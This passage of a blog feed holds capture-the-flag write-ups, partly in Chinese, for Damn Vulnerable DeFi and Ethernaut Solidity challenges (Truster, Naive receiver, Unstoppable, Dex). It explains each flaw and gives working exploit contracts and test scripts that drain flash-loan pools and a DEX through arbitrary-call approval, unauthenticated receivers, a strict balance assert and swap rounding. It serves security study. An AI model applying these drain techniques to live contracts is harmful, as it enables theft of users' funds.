back&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>First, we take a flash loan of <code>0</code> tokens (such that no repayment is required) and pass the token’s <code>approve</code> function as arguments with a payload that approves our attacker to withdraw all funds in a subsequent transaction. This works because the context under which <code>approve</code> is executed is the TrusterLenderPool contract because it is the one calling it.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function attack(uint256 amount) external &#123;</span><br><span class="line">    //msg.sender flashloan 0 ETH. Then pool approves this contract &#x27;amount&#x27; ETH.</span><br><span class="line">        pool.flashLoan(0, msg.sender, address(damnValuableToken), abi.encodeWithSignature(&quot;approve(address,uint256)&quot;, address(this), amount));</span><br><span class="line">        //So this contract can transferFrom amount ETH.</span><br><span class="line">        damnValuableToken.transferFrom(address(pool), msg.sender, amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><ul><li>TrusterAttacker</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../truster/TrusterLenderPool.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract TrusterAttacker &#123;</span><br><span class="line"></span><br><span class="line">    IERC20 public immutable damnValuableToken;</span><br><span class="line">    TrusterLenderPool private immutable pool;</span><br><span class="line"></span><br><span class="line">    constructor (address tokenAddress, address poolAddress) &#123;</span><br><span class="line">        damnValuableToken = IERC20(tokenAddress);</span><br><span class="line">        pool = TrusterLenderPool(poolAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 amount) external &#123;</span><br><span class="line">    //msg.sender flashloan 0 ETH. Then pool approves this contract &#x27;amount&#x27; ETH.</span><br><span class="line">        pool.flashLoan(0, msg.sender, address(damnValuableToken), abi.encodeWithSignature(&quot;approve(address,uint256)&quot;, address(this), amount));</span><br><span class="line">        //So this contract can transferFrom amount ETH.</span><br><span class="line">        damnValuableToken.transferFrom(address(pool), msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>test</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE  */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">AttackerContractFactory</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;TrusterAttacker&#x27;</span>, deployer);</span><br><span class="line">        <span class="keyword">const</span> attackerContract = <span class="keyword">await</span> <span class="title class_">AttackerContractFactory</span>.<span class="title function_">deploy</span>(<span class="variable language_">this</span>.<span class="property">token</span>.<span class="property">address</span>, <span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> attackerContract.<span class="title function_">connect</span>(attacker).<span class="title function_">attack</span>(<span class="variable constant_">TOKENS_IN_POOL</span>);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 05.Damn Vulnerable DeFi v2 CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.Naive receiver</title>
      <link href="/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/02.Naive%20receiver/"/>
      <url>/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/02.Naive%20receiver/</url>
      
        <content type="html"><![CDATA[<h1 id="Naive-receiver"><a href="#Naive-receiver" class="headerlink" title="Naive receiver"></a>Naive receiver</h1><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">after</span>(<span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** SUCCESS CONDITIONS */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// All ETH has been drained from the receiver</span></span><br><span class="line">        <span class="title function_">expect</span>(</span><br><span class="line">            <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="variable language_">this</span>.<span class="property">receiver</span>.<span class="property">address</span>)</span><br><span class="line">        ).<span class="property">to</span>.<span class="property">be</span>.<span class="title function_">equal</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="title function_">expect</span>(</span><br><span class="line">            <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>)</span><br><span class="line">        ).<span class="property">to</span>.<span class="property">be</span>.<span class="title function_">equal</span>(<span class="variable constant_">ETHER_IN_POOL</span>.<span class="title function_">add</span>(<span class="variable constant_">ETHER_IN_RECEIVER</span>));</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>The goal is to drain the receiver’s contract and add ETHER_IN_RECEIVER to pool contract</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant &#123;</span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line">        require(balanceBefore &gt;= borrowAmount, &quot;Not enough ETH in pool&quot;);</span><br><span class="line"></span><br><span class="line">        require(borrower.isContract(), &quot;Borrower must be a deployed contract&quot;);</span><br><span class="line">        // Transfer ETH and handle control to receiver</span><br><span class="line">        borrower.functionCallWithValue(</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                &quot;receiveEther(uint256)&quot;,</span><br><span class="line">                FIXED_FEE</span><br><span class="line">            ),</span><br><span class="line">            borrowAmount</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        require(</span><br><span class="line">            address(this).balance &gt;= balanceBefore + FIXED_FEE,</span><br><span class="line">            &quot;Flash loan hasn&#x27;t been paid back&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>address(this).balance &gt;= balanceBefore + FIXED_FEE</code>：The flash loan contract that takes a heavy fee(1ETH) on each flash loan.</p></li><li><p>The issue here is that the FlashLoanReceiver does not authenticate the caller to be the owner, so anyone can just take any flash loan on behalf of that contract. </p></li><li>To solve this challenge in a single transaction we can deploy a contract that repeatedly takes flash loans on the user contract’s behalf until its balance is less than the flash loan fee.</li><li>in the test file, receiverFlashLoanReceiver gets 10 ETH , we should drain it. </li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> deployer.<span class="title function_">sendTransaction</span>(&#123; <span class="attr">to</span>: <span class="variable language_">this</span>.<span class="property">receiver</span>.<span class="property">address</span>, <span class="attr">value</span>: <span class="variable constant_">ETHER_IN_RECEIVER</span> &#125;);</span><br></pre></td></tr></table></figure><ul><li>The FlashLoanReceiver’s function receiveEther(uint256) will pay <code>msg.value + fee</code> ETH to the pool.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function receiveEther(uint256 fee) public payable &#123;</span><br><span class="line">        require(msg.sender == pool, &quot;Sender must be pool&quot;);</span><br><span class="line"></span><br><span class="line">        uint256 amountToBeRepaid = msg.value + fee;</span><br><span class="line"></span><br><span class="line">        require(address(this).balance &gt;= amountToBeRepaid, &quot;Cannot borrow that much&quot;);</span><br><span class="line">        </span><br><span class="line">        _executeActionDuringFlashLoan();</span><br><span class="line">        </span><br><span class="line">        // Return funds to pool</span><br><span class="line">        pool.sendValue(amountToBeRepaid);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>So if we take flash loans 10 times with zero ETH to loan on the user contract’s behalf ,it will take FlashLoanReceiver 10 ETH fee in total.(Of course the transaction is called by the attacker, the gas will be decrease by attacker)</li></ul><h2 id="solutions"><a href="#solutions" class="headerlink" title="solutions"></a>solutions</h2><p>way 1</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span>   </span><br><span class="line">        <span class="keyword">const</span> attackerContract = <span class="keyword">await</span> (<span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;NaiveReceiverAttacker&#x27;</span>, attacker)).<span class="title function_">deploy</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>);</span><br><span class="line">        <span class="keyword">await</span> attackerContract.<span class="title function_">connect</span>(attacker).<span class="title function_">attack</span>(<span class="variable language_">this</span>.<span class="property">receiver</span>.<span class="property">address</span>, <span class="number">10</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>way 2</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span>   </span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">pool</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">flashLoan</span>(<span class="variable language_">this</span>.<span class="property">receiver</span>.<span class="property">address</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(i, <span class="title class_">String</span>(<span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="variable language_">this</span>.<span class="property">receiver</span>.<span class="property">address</span>)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 05.Damn Vulnerable DeFi v2 CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.unstoppable</title>
      <link href="/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/01.unstoppable/"/>
      <url>/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/01.unstoppable/</url>
      
        <content type="html"><![CDATA[<h1 id="unstoppable"><a href="#unstoppable" class="headerlink" title="unstoppable"></a>unstoppable</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="整体分析"><a href="#整体分析" class="headerlink" title="整体分析"></a>整体分析</h3><p>这是一道闪电贷的题目，UnstoppableLender合约有一个IERC20的状态变量，flashLoan方法提供在IERC20合约中的闪电贷服务，ReceiverUnstoppable合约是普通人进行闪电贷</p><p>测试文件这个代码说明：我们要让任何人都无法执行闪电贷，使UnstoppableLender合约的flashLoan方法报废reverte</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">after</span>(<span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** SUCCESS CONDITIONS */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// It is no longer possible to execute flash loans</span></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">expect</span>(</span><br><span class="line">            <span class="comment">//这里会调用UnstoppableLender合约的flashLoan方法</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">receiverContract</span>.<span class="title function_">executeFlashLoan</span>(<span class="number">10</span>)</span><br><span class="line">        ).<span class="property">to</span>.<span class="property">be</span>.<span class="property">reverted</span>;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="测试代码分析"><a href="#测试代码分析" class="headerlink" title="测试代码分析"></a>测试代码分析</h3><p>创建交易池UnstoppableLender合约，IERC20合约damnValuableToken。UnstoppableLender合约拥有一百万个IERC20代币，UnstoppableLender合约向attack用户转账100个IERC20代币。</p><p>DamnValuableToken合约是写好的，会自动检索到然后部署。这个合约给msg.sender  mint  了max(uint256)个代币，也就是DamnValuableToken合约自身拥有max(uint256)个代币。然后approve授权给UnstoppableLender合约一百万个代币，然后转账。UnstoppableLender合约就拥有了一百万个代币</p><h3 id="闪电贷代码分析"><a href="#闪电贷代码分析" class="headerlink" title="闪电贷代码分析"></a>闪电贷代码分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function flashLoan(uint256 borrowAmount) external nonReentrant &#123;</span><br><span class="line">        require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);</span><br><span class="line"></span><br><span class="line">        // Ensured by the protocol via the `depositTokens` function</span><br><span class="line">        assert(poolBalance == balanceBefore);</span><br><span class="line">        </span><br><span class="line">        damnValuableToken.transfer(msg.sender, borrowAmount);</span><br><span class="line">        </span><br><span class="line">        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);</span><br><span class="line">        </span><br><span class="line">        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>我们发现，这个方法里面先是获取了UnstoppableLender合约在IERC20合约中的余额：<code>uint256 balanceBefore = damnValuableToken.balanceOf(address(this))</code></li><li>判断UnstoppableLender合约在IERC20合约中的余额等于UnstoppableLender合约的poolBalance变量：<code>assert(poolBalance == balanceBefore);</code></li><li>但是poolBalance变量只有在别人通过<code>depositTokens()</code>方法，在IERC20合约中调用transferFrom()方法转移权益才会增加</li><li>所以这个assert断言试图确保内部余额和外部余额始终相同，但是我们可以通过transfer()来给UnstoppableLender合约一点钱来打破平衡，因为transfer()不会更新poolBalance变量。正好题目创建的时候给attacker了100个代币：<code>await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);</code>。</li><li>因此，我们用这个attack用户向UnstoppableLender合约transfer()0~100任意个代币即可通过本题</li></ul><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">transfer</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>, <span class="number">1</span>)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>assert语句仅用于通常在正常运行的代码中永远不会失败的静态验证被认为是最佳实践。在这种情况下，我们面对的不是正常运行或安全的代码，因此最好的办法是删除 assert 语句，避免拒绝服务漏洞。在一般情况下，建议将严格相等的“==”替换为“&gt;=”或“&lt;=”</p></li><li><p><a href="https://secureum.substack.com/p/security-pitfalls-and-best-practices-101">最佳实践，查看合约规范</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 05.Damn Vulnerable DeFi v2 CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>22.Dex</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/22.Dex/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/22.Dex/</url>
      
        <content type="html"><![CDATA[<h1 id="Dex"><a href="#Dex" class="headerlink" title="Dex"></a>Dex</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：将Dex中token1或者token2的余额设置为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function addLiquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题是有关swap和流动性的：一开始Dex拥有100个token1和token2，我拥有10个token1和token2，要想办法将Dex中的token1或者token2设置为0。</p><ul><li>SwappableToken合约只是一个造币的合约，并没有问题</li><li>重点来看Dex合约，这是一个简单的Dex合约，通过getSwapPrice()计算价格，然后进行swap</li></ul><p>我们无法添加流动性和设置token1和token2，因为他有onlyowner修饰，而我们并不是owner</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">  token1 = _token1;</span><br><span class="line">  token2 = _token2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addLiquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">  IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>swap：首先两个常规的<code>require()</code>进行检验，然后根据币对比例获取swap的价格，接着进行币对交换。我们进行swap的时候，必须事先给Dex合约approve，否则transferFrom()就会失败，swap失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">  require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">  require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">  uint swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">  IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">  IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本道题中的重点，根据币对比例获取swap的价格这个函数是有问题的：solidity中没有浮点数运算，任何计算结果都是整数，比如：<code>5/2=2</code>而不是<code>2.5</code>。进行下面除法的结果会将代币数量四舍五入，这样合约中其中一种代币的总余额会凭空减少。假如我们不断的进行swap，金额不断减少，直到我们拥有足够的钱来进行swap拿走全部的token1或者token2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">  return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>举一个连续swap进行攻击的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">初始状态：Dex中token1余额：100，token2余额：100。我的token1余额：10，token2余额：10。</span><br><span class="line">然后下面不断将全部token1和token2进行swap</span><br><span class="line">========【第1次swap完成】=======</span><br><span class="line">攻击之后,Dex中的token1余额为:110</span><br><span class="line">攻击之后,Dex中的token2余额为:90</span><br><span class="line">攻击之后,Dex中我的token1余额为:0</span><br><span class="line">攻击之后,Dex中我的token2余额为:20</span><br><span class="line">========【第2次swap完成】=======</span><br><span class="line">攻击之后,Dex中的token1余额为:86</span><br><span class="line">攻击之后,Dex中的token2余额为:110</span><br><span class="line">攻击之后,Dex中我的token1余额为:24</span><br><span class="line">攻击之后,Dex中我的token2余额为:0</span><br><span class="line">========【第3次swap完成】=======</span><br><span class="line">攻击之后,Dex中的token1余额为:110</span><br><span class="line">攻击之后,Dex中的token2余额为:80</span><br><span class="line">攻击之后,Dex中我的token1余额为:0</span><br><span class="line">攻击之后,Dex中我的token2余额为:30</span><br><span class="line">========【第4次swap完成】=======</span><br><span class="line">攻击之后,Dex中的token1余额为:69</span><br><span class="line">攻击之后,Dex中的token2余额为:110</span><br><span class="line">攻击之后,Dex中我的token1余额为:41</span><br><span class="line">攻击之后,Dex中我的token2余额为:0</span><br><span class="line">========【第5次swap完成】=======</span><br><span class="line">攻击之后,Dex中的token1余额为:110</span><br><span class="line">攻击之后,Dex中的token2余额为:45</span><br><span class="line">攻击之后,Dex中我的token1余额为:0</span><br><span class="line">攻击之后,Dex中我的token2余额为:65</span><br><span class="line">========【攻击完成】=======</span><br><span class="line">攻击之后,Dex中的token1余额为:0</span><br><span class="line">攻击之后,Dex中的token2余额为:90</span><br><span class="line">攻击之后,Dex中我的token1余额为:110</span><br><span class="line">攻击之后,Dex中我的token2余额为:20</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="纯ethersjs攻击"><a href="#纯ethersjs攻击" class="headerlink" title="纯ethersjs攻击"></a>纯ethersjs攻击</h3><p>头一次自己手写ethersjs代码进行攻击，学到了以下：</p><ul><li>ABI压缩成一行：<a href="https://www.sojson.com/yasuoyihang.html">工具</a></li><li>熟悉了生成可写合约并且和链上交互</li><li>进行一笔交易的时候，就算正确执行了，也必须等待它上链(使用<code>方法返回值.wait()</code>)，否则接下来执行的时候，链上数据还没确认！相当于上一步的方法执行的结果并没有得到确认</li></ul><figure 